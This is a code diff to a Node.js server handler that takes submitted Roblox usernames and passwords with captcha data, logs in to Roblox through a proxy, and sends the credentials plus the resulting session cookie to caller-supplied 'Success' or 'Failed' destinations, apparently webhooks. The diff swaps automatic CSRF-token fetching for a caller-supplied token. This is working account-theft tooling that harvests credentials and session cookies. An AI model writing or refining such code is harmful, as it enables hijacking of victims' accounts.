@@ -3,42 +3,7 @@ const axios = require('axios');
 const success_embed = require("./embed/success.js");
 const failed_emebed = require("./embed/failed.js");
 
-function restartServer(req, res) {
-    // Perform any necessary cleanup or initialization steps here
-
-    // Restart the server
-    // Replace this code with the actual server restart logic for your environment
-    console.log("Restarting the server...");
-    getarkoseblob(req, res);
-}
-
-
-async function xcsrftoken(req,res,proxyUrl) {
-    const postData = {};
-    const config = {
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        httpsAgent: new HttpsProxyAgent(proxyUrl),
-        timeout: 2000, // Set timeout to 2 seconds
-    };
-
-    let responseHeaders;
-    try {
-        const response = await axios.post('https://auth.roblox.com/v2/login', postData, config);
-        responseHeaders = response.headers;
-    } catch (error) {
-        if (error.response && typeof error.response.headers === 'undefined') {
-            console.log("Axios failed to retrieve the x-csrf-token. Refreshing the server and updating the proxy...");
-            restartServer(req, res);
-            return;
-        }
-        responseHeaders = error.response.headers; 
-    }
-    return responseHeaders['x-csrf-token'];
-}
 async function robloxlogin(req, res) {
-
     const sessionToken = req.cookies.Account_Session;
 
     const {
@@ -48,12 +13,13 @@ async function robloxlogin(req, res) {
         Failed,
         Captcha,
         ProxyUrl,
+        XCsrfToken,
     } = req.body;
 
     const delimiter = ',';
     const fcdataArray = Captcha.split(delimiter);
 
-    const requiredFields = ['Username', 'Password', 'Success', 'Failed', 'Captcha', 'ProxyUrl'];
+    const requiredFields = ['Username', 'Password', 'Success', 'Failed', 'Captcha', 'ProxyUrl','XCsrfToken'];
     const missingFields = requiredFields.filter((field) => !req.body[field]);
 
     if (missingFields.length > 0) {
@@ -62,7 +28,6 @@ async function robloxlogin(req, res) {
         });
     }
 
-    const token = await xcsrftoken(req,res,ProxyUrl);
     const postData = {
         ctype: 'username',
         cvalue: Username,
@@ -72,7 +37,7 @@ async function robloxlogin(req, res) {
     const config = {
         headers: {
             'Content-Type': 'application/json',
-            'x-csrf-token': token,
+            'x-csrf-token': XCsrfToken,
             'Rblx-Challenge-Metadata': fcdataArray[0],
             'Rblx-Challenge-Id': fcdataArray[1],
             'Rblx-Challenge-Type': 'captcha',
@@ -82,8 +47,9 @@ async function robloxlogin(req, res) {
     };
 
     let responseHeaders;
+    let response;
     try {
-        const response = await axios.post('https://auth.roblox.com/v2/login', postData, config);
+        response = await axios.post('https://auth.roblox.com/v2/login', postData, config);
         responseHeaders = response.headers;
 
         const setcookie = responseHeaders["set-cookie"];
@@ -94,14 +60,14 @@ async function robloxlogin(req, res) {
 
         if (match) {
             const cookies = match[0];
-            const embedresponse = await success_embed(Username, Password, cookies, Success,sessionToken);
-            res.status(200).json({
+            const embedresponse = await success_embed(Username, Password, cookies, Success, sessionToken);
+            return res.status(200).json({
                 success: true,
                 message: embedresponse
             });
         } else {
             failed_emebed(Username, Password, "Step verification is required for this account.", Failed);
-            res.status(400).json({
+            return res.status(400).json({
                 message: "Step verification is required for this account."
             });
         }
@@ -110,8 +76,10 @@ async function robloxlogin(req, res) {
             responseHeaders = error.response.headers;
             const errorObj = error.response.data;
 
-            if (errorObj.errors === undefined){
-                return res.status(500).json({
+            console.log(error.response.data);
+
+            if (errorObj.errors === undefined) {
+                return res.status(400).json({
                     message: "Unknown Error"
                 });
             }
@@ -119,16 +87,16 @@ async function robloxlogin(req, res) {
             const errorCodeText = errorObj.errors[0].code;
 
             failed_emebed(Username, Password, errorMessageText, Failed);
-            res.status(400).json({
+            return res.status(400).json({
                 message: errorMessageText
             });
         } else {
-            res.status(500).json({
+            console.log(error);
+            return res.status(400).json({
                 message: "Unknown Error"
             });
         }
     }
-
 }
 
 module.exports = robloxlogin;
